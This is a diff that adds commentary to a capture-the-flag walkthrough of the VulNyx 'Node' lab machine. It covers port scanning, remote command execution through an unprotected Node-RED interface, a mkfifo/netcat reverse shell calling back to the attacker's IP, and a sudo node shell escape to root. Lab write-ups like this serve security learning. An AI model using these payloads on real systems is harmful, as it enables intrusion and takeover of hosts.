@@ -87,11 +87,20 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 46.69 seconds
            Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
 ```
+There are 3 open ports:
+- `22/tcp`: ssh - OpenSSH 8.4p1 Debian 5+debu11u1 
+- `80/tcp`: http - Apache httpd 2.4.56 (Debian) - This is Apache's default page when you have not configured a virtual host or deployed any applications.
+- `1880/tcp`: http - **Node-RED**, Node.js Express framework
 
+**Node-Red** usually has a web administration interface. Without strong password protection or HTTPS, an attacker can hijack the stream.
 
 ### Shell (dev)
-![node-red-web](/walkthroughs/vulnyx/low-difficulty/node/Node-Web_web.png)
+Access address `http://192.168.100.185:1880`:
+![node-red-web](/walkthroughs/vulnyx/low-difficulty/node/Node-Red_web.png)
 
+**Node-RED** web interface is unprotected by default and allow anymore to execute arbitrary commands on the remote host by crafing the right "flow".
+
+We use python script `node_red_exploit.py` to exploit **Node-RED** Remote Command Execution. This script automates everything from creating and updating the workflow with every command you enter, getting the output back over WebSocket, to clean everything when you leave the shell.
 ```bash
 ┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/node]
 └─$ python node_red_exploit.py http://192.168.100.185:1880
@@ -116,18 +125,18 @@ file using your chosen key the next time you deploy a change.
 RuntimeWarning: Enable tracemalloc to get the object allocation traceback
 >
 ```
-
+Use `nc` to open a TCP socket on port 443 and wait for incoming connections on Kali machine.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nc -lvnp 443
 listening on [any] 443 ...
 ```
-
+We use the payload below on the newly acquired shell of the victim machine. The victim machien connects back to the attacker machine and allows remote shell control.
 ```bash
 > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.100.172 443 > /tmp/f
 
 ```
-
+We get the shell as `dev` user in the Kali machine:
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nc -lvnp 443
@@ -152,6 +161,7 @@ drwxr-xr-x 3 dev  dev  4096 may 16  2023 .npm
 ```
 ### Privilege Escalation
 #### Enumeration
+The `dev` user can run the `node` binary as `root` with `sudo`:
 ```bash
 dev@node:~$ sudo -l
 sudo -l
@@ -163,6 +173,7 @@ User dev may run the following commands on node:
     (root) NOPASSWD: /usr/bin/node
 ```
 #### Abuse
+In `GTFOBins`, they give us the shell-escape sequence and we become the `root` user.
 ```bash
 dev@node:~$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 <ild_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
@@ -171,6 +182,8 @@ whoami
 root
 ```
 #### Flags
+As a `root` user, we can read the `user.txt` and `root.txt` flags.
+
 ```bash
 # find / -name root.txt 2>/dev/null | xargs cat
 find / -name root.txt 2>/dev/null | xargs cat
